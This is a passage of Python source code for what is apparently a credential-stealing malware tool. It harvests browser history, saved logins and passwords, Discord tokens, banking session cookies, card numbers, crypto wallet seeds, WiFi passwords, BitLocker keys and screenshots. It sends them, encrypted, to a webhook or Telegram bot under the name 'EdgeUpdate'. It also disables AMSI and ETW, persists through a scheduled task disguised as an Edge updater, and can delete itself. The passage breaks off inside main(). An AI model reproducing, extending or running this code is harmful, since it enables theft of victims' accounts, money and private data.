    def _history(root: Path, profile: str, name: str, limit: int) -> List[Dict[str, Any]]:
        connection = Browsers.db(root / profile / "History")
        if not connection:
            return []
        try:
            return [{"browser": name, "url": url, "title": title, "visits": visits}
                    for url, title, visits in connection.execute(
                        f"SELECT url,title,visit_count FROM urls "
                        f"ORDER BY last_visit_time DESC LIMIT {limit}")]
        except Exception:
            return []
        finally:
            connection.close()

    @staticmethod
    def _downloads(root: Path, profile: str, name: str) -> List[Dict[str, Any]]:
        connection = Browsers.db(root / profile / "History")
        if not connection:
            return []
        try:
            return [{"browser": name, "file": target, "url": url, "size": size}
                    for target, url, size in connection.execute(
                        "SELECT target_path,tab_url,total_bytes FROM downloads "
                        "ORDER BY start_time DESC LIMIT 40")]
        except Exception:
            return []
        finally:
            connection.close()

    @staticmethod
    def _prefs(root: Path, profile: str, name: str) -> List[Dict[str, Any]]:
        path = root / profile / "Preferences"
        if not path.is_file():
            return []
        try:
            data = json.loads(path.read_text("utf-8", "ignore"))
        except Exception:
            return []
        out = []
        for entry in (data.get("account_info") or [])[:5]:
            out.append({"browser": name, "profile": profile, "email": entry.get("email"),
                        "full_name": entry.get("full_name")})
        return out

    @classmethod
    def _bookmarks(cls, root: Path, profile: str, name: str) -> List[Dict[str, Any]]:
        path = root / profile / "Bookmarks"
        if not path.is_file():
            return []
        try:
            data = json.loads(path.read_text("utf-8", "ignore"))
        except Exception:
            return []
        out: List[Dict[str, Any]] = []
        for branch in ("bookmark_bar", "other", "synced"):
            out.extend(cls._walk(data.get("roots", {}).get(branch, {}), name))
        return out[:80]

    @classmethod
    def _walk(cls, node: Any, name: str) -> List[Dict[str, Any]]:
        out: List[Dict[str, Any]] = []
        if isinstance(node, dict):
            if node.get("type") == "url":
                out.append({"browser": name, "name": node.get("name"), "url": node.get("url")})
            for child in node.get("children", []):
                out.extend(cls._walk(child, name))
        return out

    @staticmethod
    def _extensions(root: Path, profile: str, name: str) -> List[Dict[str, Any]]:
        folder = root / profile / "Extensions"
        if not folder.is_dir():
            return []
        out: List[Dict[str, Any]] = []
        for ext in folder.iterdir():
            for version in ext.iterdir():
                manifest = version / "manifest.json"
                if not manifest.is_file():
                    continue
                try:
                    data = json.loads(manifest.read_text("utf-8", "ignore"))
                    out.append({"browser": name, "id": ext.name, "name": data.get("name"),
                                "version": data.get("version")})
                except Exception:
                    continue
        return out


class Screen:
    def __init__(self) -> None:
        self.shots: List[Dict[str, Any]] = []
        Win.dpi()

    @staticmethod
    def _png(width: int, height: int, bgra: bytes) -> bytes:
        stride = width * 4
        raw = bytearray()
        for row_index in range(height):
            row = bgra[row_index * stride:(row_index + 1) * stride]
            rgb = bytearray(width * 3)
            rgb[0::3] = row[2::4]
            rgb[1::3] = row[1::4]
            rgb[2::3] = row[0::4]
            raw.append(0)
            raw += rgb

        def chunk(kind: bytes, payload: bytes) -> bytes:
            return (struct.pack(">I", len(payload)) + kind + payload +
                    struct.pack(">I", binascii.crc32(kind + payload) & 0xFFFFFFFF))

        return (b"\x89PNG\r\n\x1a\n" +
                chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)) +
                chunk(b"IDAT", zlib.compress(bytes(raw), 6)) + chunk(b"IEND", b""))

    @staticmethod
    def _windows_grab() -> Optional[bytes]:
        user32, gdi32 = ctypes.windll.user32, ctypes.windll.gdi32
        device = user32.GetWindowDC(user32.GetDesktopWindow())
        if not device:
            return None
        memory = bitmap = None
        try:
            width, height = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
            if not width or not height:
                return None
            memory = gdi32.CreateCompatibleDC(device)
            bitmap = gdi32.CreateCompatibleBitmap(device, width, height)
            gdi32.SelectObject(memory, bitmap)
            if not gdi32.BitBlt(memory, 0, 0, width, height, device, 0, 0, 0x00CC0020):
                return None

            class Header(ctypes.Structure):
                _fields_ = [("size", ctypes.c_uint32), ("width", ctypes.c_int32),
                            ("height", ctypes.c_int32), ("planes", ctypes.c_uint16),
                            ("bits", ctypes.c_uint16), ("comp", ctypes.c_uint32),
                            ("img", ctypes.c_uint32), ("xp", ctypes.c_int32),
                            ("yp", ctypes.c_int32), ("used", ctypes.c_uint32),
                            ("imp", ctypes.c_uint32)]

            header = Header()
            header.size = ctypes.sizeof(Header)
            header.width, header.height = width, -height
            header.planes, header.bits = 1, 32
            header.img = width * height * 4
            buffer = ctypes.create_string_buffer(header.img)
            if not gdi32.GetDIBits(memory, bitmap, 0, height, buffer, ctypes.byref(header), 0):
                return None
            return Screen._png(width, height, buffer.raw)
        except Exception:
            return None
        finally:
            if bitmap:
                gdi32.DeleteObject(bitmap)
            if memory:
                gdi32.DeleteDC(memory)
            user32.ReleaseDC(user32.GetDesktopWindow(), device)

    @staticmethod
    def _unix_grab() -> Optional[bytes]:
        for command in (["import", "-window", "root", "png:-"],
                        ["gnome-screenshot", "-f", "/dev/stdout"]):
            if not shutil.which(command[0]):
                continue
            try:
                result = subprocess.run(command, capture_output=True, timeout=20)
                if result.stdout[:8] == b"\x89PNG\r\n\x1a\n":
                    return result.stdout
            except Exception:
                continue
        return None

    def capture(self, index: int) -> None:
        png = self._windows_grab() if IS_WIN else self._unix_grab()
        if not png:
            return
        self.shots.append({"index": index, "at": datetime.now(timezone.utc).isoformat(),
                           "png": base64.b64encode(png).decode()})
        say("shot", index, len(png))


class Exfil:
    def __init__(self) -> None:
        self.hook = WEBHOOK_URL.strip()
        self.token = TELEGRAM_TOKEN.strip()
        self.chat = TELEGRAM_CHAT.strip()

    @property
    def ready(self) -> bool:
        return bool(self.hook or (self.token and self.chat))

    @staticmethod
    def _post(url: str, body: bytes, content_type: str, timeout: int = 60) -> int:
        request = urllib.request.Request(url, data=body, method="POST",
                                         headers={"Content-Type": content_type,
                                                  "User-Agent": USER_AGENT})
        try:
            with urllib.request.urlopen(request, timeout=timeout) as response:
                return response.status
        except urllib.error.HTTPError as exc:
            return exc.code
        except Exception:
            return 0

    async def _retry(self, call: Callable[[], int]) -> int:
        for attempt in range(RETRY_ATTEMPTS):
            status = await asyncio.to_thread(call)
            if 200 <= status < 300 or status in (400, 401, 403, 404, 413):
                return status
            await asyncio.sleep(min(RETRY_CAP, RETRY_BASE * 2 ** attempt) + random.uniform(0, 0.7))
        return 0

    async def _hook_json(self, payload: Dict[str, Any]) -> int:
        body = json.dumps(payload, ensure_ascii=False, separators=(",", ":")).encode()
        return await self._retry(lambda: self._post(
            self.hook, body, "application/json; charset=utf-8"))

    async def _hook_file(self, blob: bytes, name: str, note: str) -> int:
        boundary = uuid.uuid4().hex
        body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"payload_json\"\r\n"
                f"Content-Type: application/json\r\n\r\n"
                f"{json.dumps({'content': note})}\r\n--{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"file\"; filename=\"{name}\"\r\n"
                f"Content-Type: application/octet-stream\r\n\r\n").encode() + blob + \
               f"\r\n--{boundary}--\r\n".encode()
        return await self._retry(lambda: self._post(
            self.hook, body, f"multipart/form-data; boundary={boundary}", 240))

    async def _telegram(self, method: str, params: Dict[str, Any]) -> int:
        body = urllib.parse.urlencode(params).encode()
        return await self._retry(lambda: self._post(
            f"https://api.telegram.org/bot{self.token}/{method}", body,
            "application/x-www-form-urlencoded", 30))

    async def _telegram_file(self, blob: bytes, name: str, caption: str) -> int:
        boundary = uuid.uuid4().hex
        body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
                f"{self.chat}\r\n--{boundary}\r\nContent-Disposition: form-data; "
                f"name=\"caption\"\r\n\r\n{caption}\r\n--{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"document\"; filename=\"{name}\"\r\n"
                f"Content-Type: application/octet-stream\r\n\r\n").encode() + blob + \
               f"\r\n--{boundary}--\r\n".encode()
        return await self._retry(lambda: self._post(
            f"https://api.telegram.org/bot{self.token}/sendDocument", body,
            f"multipart/form-data; boundary={boundary}", 300))

    async def resolve_chat(self) -> None:
        if self.chat or not self.token:
            return
        try:
            with urllib.request.urlopen(
                    f"https://api.telegram.org/bot{self.token}/getUpdates",
                    timeout=15) as response:
                data = json.loads(response.read().decode())
            for update in data.get("result", []):
                chat = (update.get("message") or {}).get("chat") or {}
                if chat.get("id"):
                    self.chat = str(chat["id"])
                    return
        except Exception:
            pass

    async def send(self, sealed: bytearray, key: bytes, summary: str,
                   batches: List[List[Dict[str, Any]]], name: str) -> bool:
        if not self.ready:
            return False
        delivered = False
        if self.hook:
            for index, batch in enumerate(batches):
                await self._hook_json({
                    "username": "EdgeUpdate",
                    "content": summary if index == 0 else f"{index + 1}/{len(batches)}",
                    "embeds": batch})
                await asyncio.sleep(0.3)
            status = await self._hook_file(bytes(sealed), name, f"AES key: `{key.hex()}`")
            delivered = 200 <= status < 300 or delivered
            if status == 413:
                delivered = await self._split(sealed, summary) or delivered
        if self.token:
            await self.resolve_chat()
            if self.chat:
                await self._telegram("sendMessage", {"chat_id": self.chat, "text": summary})
                await self._telegram("sendMessage",
                                     {"chat_id": self.chat, "text": f"key: {key.hex()}"})
                status = await self._telegram_file(bytes(sealed), name, "package")
                delivered = 200 <= status < 300 or delivered
        return delivered

    async def _split(self, sealed: bytearray, summary: str) -> bool:
        encoded = base64.b64encode(bytes(sealed)).decode()
        step = 2_800_000
        for index in range(0, len(encoded), step):
            await self._hook_json({"username": "EdgeUpdate",
                                   "content": f"part {index // step + 1}\n"
                                              f"```{encoded[index:index + step]}```"})
        return True


class Present:
    """Every panel emits an explicit marker when nothing was found."""

    @staticmethod
    def _f(name: str, value: Any, inline: bool = True) -> Dict[str, Any]:
        text = "?" if value is None else str(value)
        return {"name": str(name)[:250], "value": text[:FIELD_MAX] or "?", "inline": inline}

    @staticmethod
    def _clean(fields: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        return [field for field in fields
                if field["value"].strip() and field["value"] != "?"][:25]

    @staticmethod
    def _missing(label: str) -> List[Dict[str, Any]]:
        return [{"name": label, "value": f"No data found regarding {label}", "inline": False}]

    def build(self, data: Dict[str, Any]) -> List[Dict[str, Any]]:
        network = data.get("network", {})
        public = network.get("public", {})
        audit = data.get("audit", {})
        guard = data.get("defenses", {})
        defender = guard.get("defender", {})
        exclusions = guard.get("exclusions", {})
        accounts = data.get("accounts", {})
        processes = data.get("processes", {})
        persistence = data.get("persistence", {})
        browser = data.get("browser", {})
        cookies = data.get("cookies", {})
        wallets = data.get("wallets", {})
        finance = data.get("financial", {})
        contacts = data.get("contacts", {})
        clients = data.get("clients", {})
        artifacts = data.get("artifacts", {})
        riot = data.get("riot", {})
        logins = data.get("logins", {})
        vaults = data.get("vaults", {})
        tokens = data.get("tokens", [])
        valid = [token for token in tokens if token.get("valid")]
        counts = audit.get("counts", {})
        panels: List[Dict[str, Any]] = []

        panels.append({"title": "🖥️ Identity", "color": 0x00FF9C, "fields": self._clean([
            self._f("host", data.get("host")), self._f("user", data.get("user")),
            self._f("domain", data.get("domain")), self._f("os", data.get("os")),
            self._f("build", f"{data.get('build')}.{data.get('ubr')}"),
            self._f("owner", data.get("owner")), self._f("admin", data.get("admin")),
            self._f("local ip", data.get("local_ip")), self._f("mac", data.get("mac")),
            self._f("virtual", data.get("virtualized")), self._f("uptime", data.get("uptime")),
            self._f("pid", data.get("pid")), self._f("cwd", data.get("cwd"), False)])})

        panels.append({"title": "🌍 WAN", "color": 0xF8E71C,
                       "fields": self._clean([
                           self._f("ip", public.get("ip")), self._f("city", public.get("city")),
                           self._f("region", public.get("region")),
                           self._f("country", public.get("country")),
                           self._f("org", public.get("org")), self._f("asn", public.get("asn")),
                           self._f("tz", public.get("tz"))]) or self._missing("WAN data")})

        panels.append({"title": "📡 Interfaces", "color": 0x50E3C2,
                       "fields": self._clean(
                           [self._f(item["name"], item["ip"])
                            for item in network.get("interfaces", [])[:12]] + [
                               self._f("gateway", network.get("gateway")),
                               self._f("dns cache", ", ".join(network.get("dns", [])[:10]))])
                       or self._missing("network interfaces")})

        panels.append({"title": "🔓 Ports", "color": 0xFF6B35,
                       "fields": self._clean(
                           [self._f(host, ", ".join(map(str, ports))) for host, ports in
                            list(network.get("open", {}).items())[:14]])
                       or self._missing("open ports")})

        panels.append({"title": "🕸️ LAN map", "color": 0x16A085,
                       "fields": self._clean([
                           self._f("arp", "\n".join(f"{entry['ip']} {entry['mac']}"
                                                    for entry in network.get("arp", [])[:15]),
                                   False),
                           self._f("shares", ", ".join(network.get("shares", [])[:12])),
                           self._f("mapped", "\n".join(network.get("mapped", [])[:8]), False)])
                       or self._missing("LAN neighbours")})

        panels.append({"title": f"🛡️ Posture {audit.get('score')}/100 "
                                f"(H{counts.get('high', 0)} M{counts.get('medium', 0)} "
                                f"L{counts.get('low', 0)})", "color": 0xE91E63,
                       "fields": self._clean(
                           [self._f(f"[{item['sev']}] {item['item']}", item["detail"])
                            for item in audit.get("findings", [])[:22]])
                       or self._missing("audit findings")})

        panels.append({"title": "🔥 Defenses", "color": 0xFF3B30, "fields": self._clean([
            self._f("av", ", ".join(guard.get("av", [])) or "none"),
            self._f("edr", ", ".join(guard.get("edr", [])) or "none", False),
            self._f("rt", defender.get("RealTimeProtectionEnabled")),
            self._f("tamper", defender.get("IsTamperProtected")),
            self._f("signature", defender.get("AntivirusSignatureVersion")),
            self._f("sig age", defender.get("AntispywareSignatureAge")),
            self._f("firewall off", guard.get("firewall", {}).get("off_profiles")),
            self._f("smartscreen", guard.get("smartscreen")), self._f("vbs", guard.get("vbs")),
            self._f("hvci", guard.get("hvci")), self._f("cred guard", guard.get("cred_guard")),
            self._f("lsa ppl", guard.get("lsa_ppl")),
            self._f("asr rules", len(guard.get("asr", []))),
            self._f("bypass", "\n".join(guard.get("bypass", [])[:10]), False)])})

        panels.append({"title": "🕳️ AV exclusions", "color": 0x9B59B6, "fields": self._clean([
            self._f("paths", "\n".join(exclusions.get("paths", [])[:10]) or "-", False),
            self._f("processes", "\n".join(exclusions.get("processes", [])[:10]) or "-", False),
            self._f("extensions", ", ".join(exclusions.get("extensions", [])[:15]) or "-", False),
            self._f("cfa", exclusions.get("controlled_folder")),
            self._f("maps", exclusions.get("maps"))])})

        panels.append({"title": "👤 Accounts", "color": 0x3498DB,
                       "fields": self._clean([
                           self._f("users", ", ".join(accounts.get("local", [])[:18]), False),
                           self._f("admins", "\n".join(accounts.get("admins", [])[:12]), False),
                           self._f("sessions", "\n".join(accounts.get("sessions", [])[:8]), False),
                           self._f("last logon",
                                   "\n".join(accounts.get("last_logon", [])[:10]), False)])
                       or self._missing("local accounts")})

        panels.append({"title": "⚙️ Hardware", "color": 0x7F8C8D, "fields": self._clean([
            self._f("cpu", data.get("cpu")), self._f("cores", data.get("cpu_cores")),
            self._f("ram gb", data.get("ram_gb")), self._f("bios", data.get("bios")),
            self._f("bios date", data.get("bios_date")), self._f("board", data.get("board")),
            self._f("serial", data.get("serial")), self._f("tpm", data.get("tpm")),
            self._f("secure boot", data.get("secure_boot")),
            self._f("displays", f"{data.get('monitors')} @ {data.get('resolution')}"),
            self._f("battery", data.get("battery")),
            self._f("gpu", "; ".join(data.get("gpu", []))),
            self._f("disks", "\n".join(f"{disk['device']} {disk.get('free_gb')}/"
                                       f"{disk.get('total_gb')}GB"
                                       for disk in data.get("disks", [])[:6]), False)])})

        panels.append({"title": "🔑 License", "color": 0x2ECC71, "fields": self._clean([
            self._f("product key", data.get("product_key")),
            self._f("bitlocker", data.get("bitlocker")),
            self._f("recovery keys", "\n".join(data.get("bitlocker_keys", [])), False),
            self._f("install date", data.get("install"))])})

        panels.append({"title": "🧠 Processes", "color": 0x607D8B, "fields": self._clean([
            self._f("total", processes.get("total")),
            self._f("notable", ", ".join(processes.get("interesting", [])) or "-", False),
            self._f("top", "\n".join(f"{proc['name']} {proc.get('cpu')}%"
                                     for proc in processes.get("top", [])[:12]), False)])})

        panels.append({"title": "🚀 Persistence", "color": 0x795548,
                       "fields": self._clean([
                           self._f("run", "\n".join(f"{key}: {', '.join(value)}"
                                                    for key, value in
                                                    list(persistence.get("run", {}).items())[:6])
                                   or "-", False),
                           self._f("tasks", "\n".join(task["name"] for task in
                                                      persistence.get("tasks", [])[:12])
                                   or "-", False),
                           self._f("services", ", ".join(persistence.get("services", [])[:14])
                                   or "-", False),
                           self._f("startup", ", ".join(persistence.get("startup", [])[:8])
                                   or "-", False),
                           self._f("winlogon", str(persistence.get("winlogon", {}))[:400], False),
                           self._f("wmi sub", "\n".join(persistence.get("wmi", [])[:6]) or "-",
                                   False)]) or self._missing("persistence entries")})

        panels.append({"title": "📶 WiFi", "color": 0xFF9800,
                       "fields": self._clean([self._f(entry["ssid"], f"`{entry['password']}`")
                                              for entry in data.get("wifi", [])[:18]])
                       or self._missing("WiFi profiles")})

        panels.append({"title": "🔐 Credentials", "color": 0xE67E22, "fields": self._clean([
            self._f("cmdkey", "\n".join(f"{entry.get('target')} / {entry.get('user')}"
                                        for entry in data.get("credentials", [])[:12])
                                   or "-", False),
            self._f("files", "\n".join(f"{key}: {value}"
                                       for key, value in data.get("key_files", {}).items()),
                    False),
            self._f("clipboard", data.get("clipboard"), False)])})

        panels.append({"title": "🌐 Browsers", "color": 0x1ABC9C, "fields": self._clean([
            self._f("profiles", ", ".join(browser.get("profiles", [])[:14]) or "none", False),
            self._f("accounts", "\n".join(f"{entry.get('email')} ({entry.get('browser')})"
                                          for entry in browser.get("prefs", [])[:8]) or "-",
                    False),
            self._f("extensions", str(len(browser.get("extensions", [])))),
            self._f("history", str(len(browser.get("history", [])))),
            self._f("downloads", "\n".join(entry.get("file", "")
                                           for entry in browser.get("downloads", [])[:10]),
                    False)])})

        cookie_fields = []
        for service, records in cookies.items():
            if not records or service.startswith("bank:"):
                continue
            body = "\n".join(f"{record['name']}={record['value'][:60]}"
                             for record in records[:4])
            cookie_fields.append(self._f(f"🍪 {service} ({len(records)})", body, False))
        panels.append({"title": "🍪 Cookies", "color": 0xD35400,
                       "fields": self._clean(cookie_fields[:24])
                       or self._missing("service cookies")})

        bank_fields = []
        for bucket, records in cookies.items():
            if not bucket.startswith("bank:") or not records:
                continue
            body = "\n".join(f"{record['name']}={record['value'][:50]}"
                             for record in records[:5])
            bank_fields.append(self._f(f"🏦 {bucket.split(':', 1)[1]} ({len(records)})",
                                       body, False))
        panels.append({"title": "🏦 Banking sessions", "color": 0x1E8449,
                       "fields": self._clean(bank_fields[:24])
                       or self._missing("banking sessions")})

        panels.append({"title": f"🔑 Logins ({logins.get('count', 0)})", "color": 0xF39C12,
                       "fields": self._clean(
                           [self._f(entry["url"][:60],
                                    f"{entry['user']}:`{entry['password']}`", False)
                            for entry in logins.get("chromium", [])[:16]])
                       or self._missing("saved logins")})

        if logins.get("firefox"):
            panels.append({"title": "🦊 Firefox logins", "color": 0xFF7133, "fields": self._clean(
                [self._f(profile, str(list(values.keys())))
                 for profile, values in list(logins["firefox"].items())[:8]])})

        panels.append({"title": f"💬 Discord {len(valid)}/{len(tokens)}", "color": 0x5865F2,
                       "fields": self._clean([self._f("state",
                                                      f"{len(valid)} valid of {len(tokens)}")])
                       or self._missing("Discord tokens")})

        for index, item in enumerate(tokens[:8]):
            profile = item.get("profile", {})
            fields = [self._f("token", f"`{item['token']}`", False),
                      self._f("source", item.get("source")),
                      self._f("valid", item.get("valid"))]
            if profile:
                fields.append(self._f("profile",
                                      json.dumps(profile, ensure_ascii=False)
                                      .replace("\\n", "\n")[:900], False))
            if item.get("guilds"):
                fields.append(self._f(f"guilds ({len(item['guilds'])})",
                                      ", ".join(guild["name"] for guild in item["guilds"][:14]),
                                      False))
            if item.get("connections"):
                fields.append(self._f("connections", ", ".join(
                    f"{connection['type']}:{connection.get('name')}"
                    for connection in item["connections"][:10]), False))
            if item.get("billing"):
                fields.append(self._f("billing", str(item["billing"])[:220], False))
            if item.get("nitro"):
                fields.append(self._f("nitro", item["nitro"].get("type", "?")))
            if item.get("gift_codes"):
                fields.append(self._f("gifts", str(len(item["gift_codes"]))))
            panels.append({"title": f"🔑 Discord {index + 1}", "color": 0x7289DA,
                           "fields": self._clean(fields)})

        if riot.get("summoner") or riot.get("cookies"):
            summoner = riot.get("summoner", {})
            panels.append({"title": "🎮 Riot", "color": 0xD32F2F, "fields": self._clean([
                self._f("summoner", f"{summoner.get('name')}#{summoner.get('tag')}"),
                self._f("level", summoner.get("level")),
                self._f("puuid", summoner.get("puuid"), False),
                self._f("cookies", ",".join(riot.get("cookies", {}).keys())),
                self._f("wallet", str(riot.get("wallet", {}))[:200], False)])})

        if data.get("sessions"):
            session_fields = [self._f(app, "\n".join(f"{hit['kind']}: {hit['value'][:50]}"
                                                     for hit in hits[:4]), False)
                              for app, hits in data["sessions"].items()]
            panels.append({"title": "💻 Other sessions", "color": 0x4B0082,
                           "fields": self._clean(session_fields[:20])})

        wallet_fields = [self._f(f"💰 {entry['wallet']} ({entry['browser']})",
                                 f"vault {str(entry.get('vault'))[:40]} / "
                                 f"accounts {len(entry['accounts'])}")
                         for entry in wallets.get("extensions", [])[:10]]
        wallet_fields += [self._f("keystore", entry["file"])
                          for entry in wallets.get("keystores", [])[:10]]
        wallet_fields += [self._f("seed", f"{seed['wallet']} {seed['words']}w")
                          for seed in wallets.get("seeds", [])[:8]]
        panels.append({"title": "💰 Wallets", "color": 0x8E44AD,
                       "fields": self._clean(wallet_fields)
                       or self._missing("wallet artifacts")})

        panels.append({"title": "💳 Cards & finance", "color": 0xFFD700,
                       "fields": self._clean(
                           [self._f(card["holder"], f"`{card['number']}` "
                                                    f"{card['month']}/{card['year']}")
                            for card in wallets.get("cards", [])[:12]] + [
                               self._f("iban", ", ".join(finance.get("ibans", [])[:10]), False),
                               self._f("btc", ", ".join(finance.get("btc", [])[:6]), False),
                               self._f("eth", ", ".join(finance.get("eth", [])[:6]), False)])
                       or self._missing("card and banking numbers")})

        panels.append({"title": "📇 Contacts", "color": 0x2ECC71,
                       "fields": self._clean([
                           self._f("emails", "\n".join(contacts.get("emails", [])[:20]), False),
                           self._f("phones", "\n".join(contacts.get("phones", [])[:20]), False)])
                       or self._missing("contact data")})

        panels.append({"title": "🗄️ Vaults & remote", "color": 0x566573, "fields": self._clean([
            self._f("managers", "\n".join(entry["file"] for entry in
                                          vaults.get("managers", [])[:8]), False),
            self._f("remote", json.dumps(vaults.get("remote", {}))[:600], False),
            self._f("vpn", "\n".join(vaults.get("vpn", [])[:8]), False),
            self._f("mail", ", ".join(entry["profile"] for entry in
                                      vaults.get("mail", [])[:6]), False)])})

        panels.append({"title": "📦 Clients & dumps", "color": 0x34495E, "fields": self._clean([
            self._f("roblox", str(len(clients.get("roblox_localstorage", [])))),
            self._f("steam", ",".join(clients.get("steam", {}).get("ssfn", [])) or "-"),
            self._f("telegram", clients.get("telegram", {}).get("path") or "-"),
            self._f("minecraft", "yes" if any(key.startswith("minecraft")
                                              for key in clients) else "-"),
            self._f("ftp", ", ".join(key for key in clients
                                     if key.startswith(("filezilla", "winscp"))) or "-"),
            self._f("hives", ", ".join(artifacts.get("hives", {}).keys()) or "-"),
            self._f("dpapi", str(len(artifacts.get("dpapi", [])))),
            self._f("vault files", str(len(artifacts.get("vault", [])))),
            self._f("lsass", "yes" if artifacts.get("lsass") else "-"),
            self._f("notes", "; ".join(artifacts.get("notes", [])[:5]), False),
            self._f("shots", str(len(data.get("screenshots", [])))),
            self._f("aggressive", data.get("aggressive"))])})

        if data.get("documents"):
            panels.append({"title": "📄 Key files", "color": 0x95A5A6, "fields": self._clean(
                [self._f(folder, ", ".join(entry["file"] for entry in entries[:6]), False)
                 for folder, entries in list(data["documents"].items())[:14]])})

        return panels

    @staticmethod
    def pack(panels: List[Dict[str, Any]]) -> List[List[Dict[str, Any]]]:
        batches: List[List[Dict[str, Any]]] = []
        current: List[Dict[str, Any]] = []
        size = 0
        for panel in panels:
            length = len(panel.get("title", "")) + sum(
                len(field["name"]) + len(field["value"]) for field in panel.get("fields", []))
            if current and (size + length > EMBED_CHAR_BUDGET or len(current) >= EMBEDS_PER_MSG):
                batches.append(current)
                current, size = [], 0
            current.append(panel)
            size += length
        if current:
            batches.append(current)
        return batches


class Runner:
    def __init__(self) -> None:
        self.screen = Screen()
        self.exfil = Exfil()

    @staticmethod
    def _enabled(key: str) -> bool:
        return FEATURES.get(key, False)

    async def run(self, want_lsass: bool = False) -> None:
        global AGGRESSIVE
        data: Dict[str, Any] = {"aggressive": False}

        if self._enabled("screenshots"):
            self.screen.capture(1)

        if self._enabled("evasion"):
            Native.amsi()
            Native.etw()
            Native.hide_thread()

        if self._enabled("defenses"):
            defenses = await asyncio.to_thread(Defenses().run, self._enabled("evasion"))
            data["defenses"] = defenses
            AGGRESSIVE = not defenses.get("present", False)
            data["aggressive"] = AGGRESSIVE
            await breathe()

        if self._enabled("system"):
            data.update(await asyncio.to_thread(SystemInfo().collect))
            self.screen.capture(2)
            await breathe()

        if self._enabled("network"):
            data["network"] = await asyncio.to_thread(Network().run)
            self.screen.capture(3)
            await breathe()

        if self._enabled("audit"):
            data["audit"] = await asyncio.to_thread(Audit().run, data.get("network", {}))
            await breathe()

        discord = Discord()
        raw: List[Dict[str, Any]] = []
        if self._enabled("discord"):
            raw = await asyncio.to_thread(discord.tokens)
        data["tokens"] = await asyncio.to_thread(discord.enrich, raw) if raw else []

        jobs: List[Tuple[str, Callable[[], Any]]] = []
        if self._enabled("sessions"):
            jobs.append(("sessions", Sessions().run))
        if self._enabled("riot"):
            jobs.append(("riot", Riot().run))
        if self._enabled("cookies"):
            jobs.append(("cookies", Cookies().scan))
        if self._enabled("logins"):
            jobs.append(("logins", Logins().run))
        if self._enabled("browser"):
            jobs.append(("browser", BrowserData().run))
        if self._enabled("wallets"):
            jobs.append(("wallets", Wallets().run))
        if self._enabled("financial"):
            jobs.append(("financial", Financial().run))
        if self._enabled("contacts"):
            jobs.append(("contacts", lambda: Contacts().run(data["tokens"])))
        if self._enabled("documents"):
            jobs.append(("documents", Documents().run))
        if self._enabled("vaults"):
            jobs.append(("vaults", Vaults().run))
        if self._enabled("clients"):
            jobs.append(("clients", Clients().run))
        if self._enabled("artifacts"):
            jobs.append(("artifacts", lambda: Artifacts().run(want_lsass)))

        for key, factory in jobs:
            try:
                data[key] = await asyncio.to_thread(factory)
            except Exception as exc:
                data[key] = {"error": str(exc)[:160]}
            await breathe()

        if self._enabled("screenshots"):
            self.screen.capture(4)
            await asyncio.sleep(0.4)
            self.screen.capture(5)

        data["screenshots"] = self.screen.shots
        await self.dispatch(data)

    async def dispatch(self, data: Dict[str, Any]) -> None:
        raw = bytearray(json.dumps(data, ensure_ascii=False, default=str).encode())
        sealed, key = CRYPTO.seal(bytes(raw))

        while len(sealed) > WEBHOOK_SOFT_LIMIT:
            if data.get("screenshots"):
                data["screenshots"].pop()
            elif data.get("browser", {}).get("history"):
                data["browser"]["history"] = data["browser"]["history"][:50]
            elif data.get("cookies", {}).get("otros"):
                data["cookies"]["otros"] = data["cookies"]["otros"][:20]
            else:
                break
            scrub(raw, sealed)
            raw = bytearray(json.dumps(data, ensure_ascii=False, default=str).encode())
            sealed, key = CRYPTO.seal(bytes(raw))

        valid = [token for token in data.get("tokens", []) if token.get("valid")]
        bank_hits = sum(len(records) for bucket, records in data.get("cookies", {}).items()
                        if bucket.startswith("bank:"))
        summary = (f"**{data.get('host')}** | {data.get('user')} | "
                   f"{data.get('network', {}).get('public', {}).get('ip')} | "
                   f"score {data.get('audit', {}).get('score')} | "
                   f"tokens {len(valid)}/{len(data.get('tokens', []))} | "
                   f"logins {data.get('logins', {}).get('count', 0)} | "
                   f"bank cookies {bank_hits} | aggressive {data.get('aggressive')}")

        await self.exfil.send(sealed, key, summary,
                              Present.pack(Present().build(data)),
                              f"{data.get('host', 'host')}-{uuid.uuid4().hex[:6]}.bin")

        scrub(raw, sealed)
        data.clear()
        gc.collect()


def persist_add() -> None:
    if not IS_WIN:
        return
    exe = sys.executable
    if exe.lower().endswith("python.exe"):
        candidate = Path(exe).with_name("pythonw.exe")
        if candidate.is_file():
            exe = str(candidate)
    Win.run(["schtasks", "/create", "/f", "/tn", "MicrosoftEdgeUpdateTaskMachineUA2",
             "/tr", f'"{exe}" "{Path(sys.argv[0]).resolve()}"', "/sc", "onlogon",
             "/rl", "limited"], 25)


def persist_del() -> None:
    if IS_WIN:
        Win.run(["schtasks", "/delete", "/f", "/tn", "MicrosoftEdgeUpdateTaskMachineUA2"], 20)


def wipe() -> None:
    if not (IS_WIN and getattr(sys, "frozen", False)):
        return
    target = Path(sys.argv[0]).resolve()
    subprocess.Popen(f'ping -n 5 127.0.0.1 >nul & del /f /q "{target}"', shell=True,
                     creationflags=0x00000008 | 0x00000200,
                     stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL)


def main() -> int:
    global VERBOSE, QUIET
    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument("--verbose", action="store_true")
    parser.add_argument("--delay", type=int, default=0)
    parser.add_argument("--no-shots", action="store_true")
    parser.add_argument("--no-forge", action="store_true")
    parser.add_argument("--no-evade", action="store_true")
    parser.add_argument("--lsass", action="store_true")
    parser.add_argument("--quiet", action="store_true")
    parser.add_argument("--persist", action="store_true")
    parser.add_argument("--unpersist", action="store_true")
    parser.add_argument("--self-delete", action="store_true")
    parser.add_argument("--only", default="")
    parser.add_argument("--skip", default="")
    args = parser.parse_args()

    VERBOSE = args.verbose
    QUIET = args.quiet
    Win.hide()

    if args.unpersist:
        persist_del()
        return 0
    if not Win.mutex():
        return 0

    if not args.no_forge and not os.environ.get("BS_FORGED"):
        forged = Forge.build()
        if forged:
            Forge.relaunch(forged)
            return 0

    if args.delay:
        time.sleep(random.uniform(0, args.delay))

    if args.no_shots:
